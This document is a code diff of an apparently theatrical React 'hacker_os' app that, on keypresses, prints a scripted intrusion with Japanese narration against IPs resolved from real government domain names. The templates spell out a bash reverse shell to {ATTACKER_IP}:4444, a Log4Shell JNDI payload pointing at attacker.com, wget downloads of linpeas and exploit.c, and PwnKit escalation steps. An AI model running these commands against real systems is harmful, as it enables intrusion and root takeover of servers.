@@ -64,12 +64,12 @@ const ACCESS_LOG_TEMPLATES = [
   { log: "[INFO] Determining localhost public IP address...", msg: "ローカルサーバーのパブリックIPを取得中。", task: "LOCAL SETUP" },
   { log: "LOCALHOST IP: {ATTACKER_IP}", msg: "ローカルサーバーのIPを特定。\n接続待機ポートを4444にセット。", task: "LOCAL SETUP" },
   { log: "Generating reverse shell command...", msg: "ターゲット上で実行させる通信確立用コマンドを生成中。", task: "CMD GENERATION" },
-  { log: "RAW CMD: bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1", msg: "ターゲットのBash入出力をローカルサーバーと接続し、\n操作権を移譲するコードを構築。", task: "CMD GENERATION" },
+  { log: "RAW CMD: bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1", msg: "ターゲットのBash入出力をローカルサーバーと接続し、操作権を移譲するコードを構築。", task: "CMD GENERATION" },
   { log: "[INFO] Encoding command to Base64 for WAF/IDS bypass...", msg: "セキュリティ製品の検知を回避するため、コマンドをBase64でエンコード中。", task: "PAYLOAD ENCODING" },
   { log: "B64 ENCODED: {B64_CMD}", msg: "エンコード完了。\nBase64シリアライズされたペイロードを構築。", task: "PAYLOAD ENCODING" },
   { log: "Constructing final JNDI injection payload...", msg: "JNDIプロトコルに適合する最終的な攻撃パケットを構成中。", task: "PAYLOAD FINAL" },
   { log: "PAYLOAD: ${jndi:ldap://attacker.com:1389/Basic/Command/Base64/{B64_CMD}}", msg: "Log4Shell用ペイロードが完成。\nターゲットへ送信する準備が整いました。", task: "PAYLOAD FINAL" },
-  { log: "curl -X POST -H 'User-Agent: ${jndi:ldap://attacker.com:1389/Basic/Command/Base64/{B64_CMD}}' http://{IP}:8080/", msg: "ターゲットの8080ポートへ\nHTTP POSTリクエストを送信中。", task: "EXPLOIT EXECUTION" },
+  { log: "curl -X POST -H 'User-Agent: ${jndi:ldap://attacker.com:1389/Basic/Command/Base64/{B64_CMD}}' http://{IP}:8080/", msg: "ターゲットの8080ポートへHTTP POSTリクエストを送信中。", task: "EXPLOIT EXECUTION" },
   { log: "[INFO] Payload sent. Waiting for reverse connection...", msg: "リクエスト送信完了。\nターゲットからのバックコネクトを待機。", task: "SHELL LISTENER" },
   { log: "{WAIT_SEARCH}", msg: "ポート4444にてリスナー待機中。\n認証バイパスを確認しています。", task: "SHELL LISTENER" },
   { log: "[+] Connection received from {IP}:49210", msg: "接続確立。\nターゲットサーバー内のプロセス制御権を獲得しました。", task: "CONNECTION ESTABLISHED" },
@@ -80,15 +80,34 @@ const ACCESS_LOG_TEMPLATES = [
 
 const ESCALATION_LOG_TEMPLATES = [
   { log: "[INFO] Starting Phase 4: Privilege Escalation...", msg: "フェーズ4：権限昇格を開始。\nroot権限（管理者）の奪取を試みます。", task: "LPE INITIATION" },
-  { log: "www-data@target-server:/$ python3 linpeas.py", msg: "システム内部の脆弱性を列挙するため、自動調査スクリプトを実行中。", task: "ENUMERATION" },
-  { log: "{WAIT_SEARCH}", msg: "LinPEASによる内部調査中。\n設定ミスやSUIDバイナリを探索しています。", task: "ENUMERATION" },
-  { log: "[!] SUID binary found: /usr/bin/pkexec", msg: "SUIDビットが設定された不審なバイナリを発見。\nエクスプロイトの可能性があります。", task: "VECTOR IDENTIFIED" },
-  { log: "[INFO] Exploiting PwnKit (CVE-2021-4034)...", msg: "pkexecの脆弱性を利用して、管理者権限への昇格コードを実行します。", task: "LPE EXECUTION" },
-  { log: "www-data@target-server:/$ gcc exploit.c -o exploit && ./exploit", msg: "エクスプロイトコードをコンパイルし、メモリ破壊攻撃を開始。", task: "LPE EXECUTION" },
-  { log: "[+] Exploit successful. Switching UID to 0...", msg: "エクスプロイト成功。\nプロセスID 0（root）への移行を確認しました。", task: "PRIVILEGE GAINED" },
-  { log: "root@target-server:/# whoami", msg: "最終的な権限を確認中。", task: "PRIVILEGE GAINED" },
-  { log: "root", msg: "最高権限「root」の奪取に成功。\nシステムの完全支配を達成。", task: "PRIVILEGE GAINED" },
-  { log: "[SUCCESS] Phase 4: Privilege Escalation successful. Full system control granted.", msg: "フェーズ4：権限昇格成功。\n極秘データへのアクセスが可能になりました。", task: "MISSION COMPLETE" }
+  { log: "www-data@target-server:/$ id", msg: "現在のユーザーIDと所属グループを確認中。", task: "ENUMERATION" },
+  { log: "uid=33(www-data) gid=33(www-data) groups=33(www-data)", msg: "現在、制限されたWebサーバー権限であることを確認。", task: "ENUMERATION" },
+  { log: "www-data@target-server:/$ uname -a", msg: "OSのカーネルバージョンを取得中。", task: "ENUMERATION" },
+  { log: "Linux target-server 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 x86_64 GNU/Linux", msg: "Linuxカーネル 5.10.0を特定。\n既知の脆弱性（LPE）を調査対象にします。", task: "ENUMERATION" },
+  { log: "www-data@target-server:/$ wget http://{ATTACKER_IP}/linpeas.py", msg: "ローカルサーバーから内部調査用スクリプトをターゲットサーバーへ転送中。", task: "SCRIPT TRANSFER" },
+  { log: "[INFO] Download successful. 320KB received.", msg: "転送完了。\nスクリプトの完全性を確認しました。", task: "SCRIPT TRANSFER" },
+  { log: "www-data@target-server:/$ chmod +x linpeas.py && python3 linpeas.py", msg: "実行権限を付与し、自動調査を開始します。", task: "LINPEAS RUN" },
+  { log: "{WAIT_SEARCH}", msg: "LinPEASによる高度な内部調査中。\n設定ミスやカーネル脆弱性を探索しています。", task: "LINPEAS RUN" },
+  { log: "[!] SUID binary found: /usr/bin/pkexec\n[!] Vulnerable to PwnKit (CVE-2021-4034)\n[!] Vulnerable to Dirty Pipe (CVE-2022-0847)", msg: "複数の管理者権限奪取ルートを特定。\nPwnKitによるエクスプロイトを選択。", task: "VECTOR IDENTIFIED" },
+  { log: "[INFO] Exploiting PwnKit (CVE-2021-4034)...", msg: "pkexecのメモリ破損の脆弱性を利用して、管理者シェルを召喚しています。", task: "LPE EXECUTION" },
+  { log: "www-data@target-server:/$ wget http://{ATTACKER_IP}/exploit.c", msg: "ローカルサーバーから権限昇格用エクスプロイトコードをダウンロード中。", task: "EXPLOIT TRANSFER" },
+  { log: "[INFO] Download successful. 4.2KB received.", msg: "ダウンロード完了。\nコンパイル準備を開始します。", task: "EXPLOIT TRANSFER" },
+  { log: "www-data@target-server:/$ gcc -Wall exploit.c -o exploit", msg: "ターゲットサーバー上で、エクスプロイトのネイティブコンパイルを実行しています。", task: "LPE BUILD" },
+  { log: "{GCC_OUTPUT}", msg: "コンパイル完了。\n警告を確認しましたが、バイナリの生成に成功しました。", task: "LPE BUILD" },
+  { log: "www-data@target-server:/$ chmod +x exploit && ./exploit", msg: "生成したバイナリに実行権限を付与し、特権昇格エクスプロイトを起動します。", task: "LPE EXECUTION" },
+  { log: "[STAGE 1] Validating target SUID binary permissions... OK", msg: "攻撃対象となるpkexecの実行権限とSUIDビットの状態を確認中。", task: "LPE STAGING" },
+  { log: "[STAGE 2] Searching for usable environment pointers... FOUND (0x7ffe3a21)", msg: "メモリ内の環境変数ポインタを探索。\n注入可能なアドレスを特定しました。", task: "LPE STAGING" },
+  { log: "[STAGE 3] Injecting GCONV_PATH into envp array... SUCCESS", msg: "環境変数配列に偽のGCONV_PATHを注入。\nライブラリの読み込みパスを偽装します。", task: "LPE STAGING" },
+  { log: "[STAGE 4] Triggering out-of-bounds write via iconv_open()...", msg: "iconv_open関数を呼び出し、意図的な境界外書き込み（OOB）を誘発中。", task: "LPE STAGING" },
+  { log: "[STAGE 5] Overwriting effective UID to 0... SUCCESS", msg: "プロセスの実効ユーザーIDを0（root）へ強制的に書き換えることに成功しました。", task: "LPE STAGING" },
+  { log: "[STAGE 6] Executing execve(\"/bin/sh\", NULL, NULL)...", msg: "root権限を保持したまま、特権シェルの起動プロセスを実行します。", task: "LPE STAGING" },
+  { log: "[+] Exploit successful. Spawning root shell...", msg: "エクスプロイト成功。\nターゲットの管理権限によるBashプロセスの起動を確認。", task: "SHELL SPAWNING" },
+  { log: "[+] Switching UID from 33 to 0 (root)", msg: "プロセスの権限委譲が完了。\nシステム最高権限へ移行しました。", task: "PRIVILEGE GAINED" },
+  { log: "root@target-server:/# id", msg: "昇格後の権限を最終確認しています。", task: "PRIVILEGE GAINED" },
+  { log: "uid=0(root) gid=0(root) groups=0(root)", msg: "最高権限「root」の奪取を確認。\nシステムの完全掌握に成功。", task: "PRIVILEGE GAINED" },
+  { log: "root@target-server:/# whoami", msg: "カレントユーザー名の確認。", task: "PRIVILEGE GAINED" },
+  { log: "root", msg: "ミッションの最終目的であるrootアクセスを確立しました。", task: "PRIVILEGE GAINED" },
+  { log: "[SUCCESS] Phase 4: Privilege Escalation successful. Full system control granted.", msg: "フェーズ4：権限昇格成功。\nこれより機密データの抽出を開始します。", task: "MISSION COMPLETE" }
 ];
 
 const App: React.FC = () => {
@@ -98,16 +117,17 @@ const App: React.FC = () => {
   const [targetIP, setTargetIP] = useState<string>("0.0.0.0");
   const [attackerIP] = useState(() => `${Math.floor(Math.random() * 200 + 40)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`);
   const [rawJSON, setRawJSON] = useState<string>("{}");
+  const [gccOutput, setGccOutput] = useState<string>("");
   const [targetDomain] = useState(() => REAL_GOV_DOMAINS[Math.floor(Math.random() * REAL_GOV_DOMAINS.length)]);
   const [phase, setPhase] = useState<1 | 2 | 3 | 4>(1);
   const [waitingForEnter, setWaitingForEnter] = useState(false);
   const [isSearching, setIsSearching] = useState(false);
-  
+
   const [cpuLoad, setCpuLoad] = useState<number>(12.4);
   const [netTraffic, setNetTraffic] = useState<string>("240.5 KB/s");
   const [uptime, setUptime] = useState<string>("00:00:00:00");
   const startTimeRef = useRef(Date.now());
-  
+
   const logIndexRef = useRef(0);
   const keyCounterRef = useRef(0);
   const bottomRef = useRef<HTMLDivElement>(null);
@@ -115,7 +135,7 @@ const App: React.FC = () => {
   const KEYS_PER_LINE = 2;
 
   useEffect(() => {
-    const fetchRealIP = async () => {
+    const fetchInitialData = async () => {
       try {
         const response = await fetch(`https://dns.google/resolve?name=${targetDomain}&type=A`);
         const data = await response.json();
@@ -129,8 +149,17 @@ const App: React.FC = () => {
         console.error("DNS Resolution failed:", error);
         setTargetIP("23.62.106.138");
       }
+
+      try {
+        const response = await fetch('/gcc/gcc_output.txt');
+        const text = await response.text();
+        setGccOutput(text);
+      } catch (error) {
+        console.error("GCC log fetch failed:", error);
+        setGccOutput("gcc: error: exploit.c: No such file or directory");
+      }
     };
-    fetchRealIP();
+    fetchInitialData();
   }, [targetDomain]);
 
   useEffect(() => {
@@ -159,7 +188,7 @@ const App: React.FC = () => {
     setWaitingForEnter(false);
     setIsSearching(false);
     setDisplayedLogs([]);
-    
+
     if (targetPhase === 1) {
       setActiveMessage("Initializing hacker_os...");
       setActiveTask("BOOTING SYSTEM");
@@ -194,7 +223,7 @@ const App: React.FC = () => {
       if (e.key.length > 1 && e.key !== 'Enter' && e.key !== 'Space' && e.key !== 'Backspace') return;
 
       keyCounterRef.current += 1;
-      
+
       if (keyCounterRef.current >= KEYS_PER_LINE) {
         const currentIndex = logIndexRef.current;
         const templates = {
@@ -204,15 +233,18 @@ const App: React.FC = () => {
           4: ESCALATION_LOG_TEMPLATES
         };
         const currentTemplates = templates[phase];
-        
+
         if (currentIndex < currentTemplates.length) {
           const item = currentTemplates[currentIndex];
-          
+
           if (item.log === "{RAW_JSON}") {
             const jsonLines = rawJSON.split('\n');
             setDisplayedLogs(prev => [...prev, ...jsonLines]);
           } else if (item.log === "{CVE_DATA}") {
             setDisplayedLogs(prev => [...prev, ...REAL_CVE_DATABASE]);
+          } else if (item.log === "{GCC_OUTPUT}") {
+            const gccLines = gccOutput.split('\n');
+            setDisplayedLogs(prev => [...prev, ...gccLines]);
           } else if (item.log === "{WAIT_SEARCH}") {
             setIsSearching(true);
             setDisplayedLogs(prev => [...prev, "Processing system call... [WAIT]"]);
@@ -231,9 +263,14 @@ const App: React.FC = () => {
               .replace(/{DOMAIN}/g, targetDomain)
               .replace(/{ATTACKER_IP}/g, attackerIP)
               .replace(/{B64_CMD}/g, base64Cmd);
-            setDisplayedLogs(prev => [...prev, logLine]);
+
+            if (logLine.includes('\n')) {
+              setDisplayedLogs(prev => [...prev, ...logLine.split('\n')]);
+            } else {
+              setDisplayedLogs(prev => [...prev, logLine]);
+            }
           }
-          
+
           setActiveMessage(item.msg);
           setActiveTask(item.task);
           logIndexRef.current += 1;
@@ -255,7 +292,7 @@ const App: React.FC = () => {
 
     window.addEventListener('keydown', handleKeyDown);
     return () => window.removeEventListener('keydown', handleKeyDown);
-  }, [targetIP, attackerIP, targetDomain, rawJSON, phase, waitingForEnter, isSearching]);
+  }, [targetIP, attackerIP, targetDomain, rawJSON, gccOutput, phase, waitingForEnter, isSearching]);
 
   useEffect(() => {
     bottomRef.current?.scrollIntoView({ behavior: 'smooth' });
@@ -264,16 +301,20 @@ const App: React.FC = () => {
   return (
     <div className="bg-black h-screen w-screen text-[#00ff41] flex overflow-hidden font-['JetBrains_Mono']">
       <div className="fixed inset-0 pointer-events-none opacity-5 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[length:100%_2px,3px_100%] z-50"></div>
-      
+
       <div className="w-2/3 h-full p-8 flex flex-col justify-start items-start select-text overflow-y-auto leading-none border-r border-[#00ff41]/20 scrollbar-hide">
         <div className="w-full max-w-7xl z-10 flex flex-col text-base md:text-lg pb-24 tracking-tighter">
           {displayedLogs.map((log, i) => {
             const isTargetServer = log.includes('@target-server') || log === 'www-data' || log === 'root';
+            const isBuildWarning = log.includes('warning:') || log.includes('error:');
+            const isStage = log.startsWith('[STAGE');
             return (
               <div key={i} className="flex space-x-3 py-0">
                 <span className="opacity-40 text-[11px] shrink-0 select-none mt-1 text-green-300">[{new Date().toLocaleTimeString()}]</span>
                 <span className={`
                   ${isTargetServer ? 'text-[#ffb000]' : ''}
+                  ${isBuildWarning ? 'text-white italic opacity-80' : ''}
+                  ${isStage ? 'text-cyan-300 font-bold' : ''}
                   ${log.startsWith('[SUCCESS]') ? 'text-cyan-400 font-bold' : ''}
                   ${log.startsWith('[INFO]') ? 'text-yellow-100 font-bold' : ''}
                   ${log.startsWith('[FOUND]') ? 'text-blue-300' : ''}
@@ -290,14 +331,13 @@ const App: React.FC = () => {
             );
           })}
           <div className="flex items-center space-x-4 pt-3">
-            <span className={`font-bold shrink-0 opacity-80 select-none ${
-              phase >= 4 && displayedLogs.some(l => l.includes('root@target-server')) ? 'text-[#ffb000]' : 
-              phase >= 3 && displayedLogs.some(l => l.includes('www-data@target-server')) ? 'text-[#ffb000]' : 
-              'text-[#00ff41]'
-            }`}>
-              {phase >= 4 && displayedLogs.some(l => l.includes('root@target-server')) ? 'root@target-server:/#' : 
-               phase >= 3 && displayedLogs.some(l => l.includes('www-data@target-server')) ? 'www-data@target-server:/$' : 
-               'root@hacker_os:~#'}
+            <span className={`font-bold shrink-0 opacity-80 select-none ${phase >= 4 && displayedLogs.some(l => l.includes('root@target-server')) ? 'text-[#ffb000]' :
+                phase >= 3 && displayedLogs.some(l => l.includes('www-data@target-server')) ? 'text-[#ffb000]' :
+                  'text-[#00ff41]'
+              }`}>
+              {phase >= 4 && displayedLogs.some(l => l.includes('root@target-server')) ? 'root@target-server:/#' :
+                phase >= 3 && displayedLogs.some(l => l.includes('www-data@target-server')) ? 'www-data@target-server:/$' :
+                  'root@hacker_os:~#'}
             </span>
             <div className="flex flex-col">
               {waitingForEnter ? (
@@ -305,9 +345,8 @@ const App: React.FC = () => {
               ) : isSearching ? (
                 <span className="text-yellow-400 font-bold text-sm ml-2 tracking-widest">SYSTEM PROCESSING... [WAIT]</span>
               ) : (
-                <span className={`w-2.5 h-5 shrink-0 ${
-                  phase >= 3 && displayedLogs.some(l => l.includes('@target-server')) ? 'bg-[#ffb000]' : 'bg-[#00ff41]'
-                }`}></span>
+                <span className={`w-2.5 h-5 shrink-0 ${phase >= 3 && displayedLogs.some(l => l.includes('@target-server')) ? 'bg-[#ffb000]' : 'bg-[#00ff41]'
+                  }`}></span>
               )}
             </div>
           </div>
@@ -322,11 +361,10 @@ const App: React.FC = () => {
               <button
                 key={p}
                 onClick={() => jumpToPhase(p as any)}
-                className={`text-[9px] px-3 py-1 border transition-all duration-300 ${
-                  phase === p 
-                    ? 'bg-[#00ff41] text-black border-[#00ff41] font-bold shadow-[0_0_10px_rgba(0,255,0,0.5)]' 
+                className={`text-[9px] px-3 py-1 border transition-all duration-300 ${phase === p
+                    ? 'bg-[#00ff41] text-black border-[#00ff41] font-bold shadow-[0_0_10px_rgba(0,255,0,0.5)]'
                     : 'bg-transparent text-[#00ff41] border-[#00ff41]/30 hover:border-[#00ff41] hover:shadow-[0_0_5px_rgba(0,255,0,0.2)]'
-                }`}
+                  }`}
               >
                 PHASE {p}
               </button>
@@ -336,7 +374,7 @@ const App: React.FC = () => {
           <div className="mb-8 border-b border-[#00ff41]/30 pb-4 shrink-0">
             <h2 className="text-xs uppercase tracking-widest opacity-50 mb-2 font-sans font-bold text-[#00ff41]">System Narrative Monitor</h2>
             <div key={phase} className="text-cyan-400 font-bold text-sm uppercase tracking-tighter mb-1">
-              ACTIVE PHASE: {phase === 1 ? 'RECONNAISSANCE' : phase === 2 ? 'VULNERABILITY ANALYSIS' : phase === 3 ? 'INITIAL ACCESS' : 'PRIVILEGE ESCALATION'}
+              ACTIVE PHASE: {phase === 1 ? 'RECONNAISSANCE' : phase === 2 ? 'VULNERABILITY ANALYSIS' : phase === 3 ? 'INITIAL ACCESS' : phase === 4 ? 'PRIVILEGE ESCALATION' : ''}
             </div>
             <div key={activeTask} className="text-green-500 text-[10px] uppercase tracking-[0.2em] font-bold animate-fade-in">
               CURRENT TASK: {activeTask}
